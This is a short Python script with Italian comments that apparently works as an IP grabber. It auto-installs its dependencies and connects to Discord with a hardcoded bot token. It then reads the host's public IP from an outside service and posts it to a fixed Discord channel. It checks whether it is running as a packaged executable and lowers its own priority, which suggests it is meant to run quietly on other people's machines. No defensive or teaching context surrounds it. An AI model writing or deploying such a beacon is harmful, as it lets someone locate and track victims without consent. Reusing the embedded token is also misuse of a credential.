import sys
import subprocess
import pkg_resources

required_packages = ['discord', 'requests', 'psutil']

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Verifica e installa i pacchetti mancanti
for package in required_packages:
    try:
        pkg_resources.require(package)
    except pkg_resources.DistributionNotFound:
        print(f"Installazione di {package}...")
        install(package)

import discord
import requests
import psutil
import os

TOKEN = '5b66ee4163dbd8ad77ddad3a1344bb8e9410a141a916bd5a3c78738c5f7ff5de'
CHANNEL_ID = 1263382252050583556  # Sostituisci con l'ID del canale Discord

intents = discord.Intents.default()
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(f'{client.user} si è connesso a Discord!')
    channel = client.get_channel(CHANNEL_ID)
    
    try:
        ip = requests.get('https://api.ipify.org').text
        await channel.send(f"L'indirizzo IP della macchina è: {ip}")
    except Exception as e:
        await channel.send(f"Si è verificato un errore nel recupero dell'IP: {str(e)}")
    
    await client.close()

def is_running_as_executable():
    return getattr(sys, 'frozen', False)

if __name__ == "__main__":
    if is_running_as_executable():
        try:
            pid = os.getpid()
            current_process = psutil.Process(pid)
            current_process.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)
        except Exception as e:
            print(f"Errore nel settaggio della priorità: {e}")
    
    client.run(TOKEN)
